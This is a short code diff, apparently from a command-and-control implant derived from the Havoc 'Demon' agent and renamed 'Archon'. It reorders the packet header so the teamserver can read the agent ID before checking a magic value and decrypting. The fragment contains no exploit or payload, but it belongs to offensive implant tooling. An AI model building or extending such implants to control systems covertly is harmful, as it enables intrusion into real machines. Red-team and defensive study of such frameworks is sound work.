@@ -175,9 +175,12 @@ PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
 {
     PPACKAGE Package = PackageCreate( CommandID );
 
-    PackageAddInt32( Package, 0 ); // package length
-    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance->Session.AgentID );
+    /* ARC-10: Archon header layout: size | agent_id | magic
+     * The teamserver reads agent_id first (bytes 4-7) so it can look up the
+     * per-agent expected magic before validating — and before AES decryption. */
+    PackageAddInt32( Package, 0 );                           /* size (filled in on send) */
+    PackageAddInt32( Package, Instance->Session.AgentID );   /* agent_id at bytes 4-7   */
+    PackageAddInt32( Package, ARCHON_MAGIC_VALUE );          /* magic   at bytes 8-11   */
     PackageAddInt32( Package, Package->CommandID );
     PackageAddInt32( Package, Package->RequestID );
 
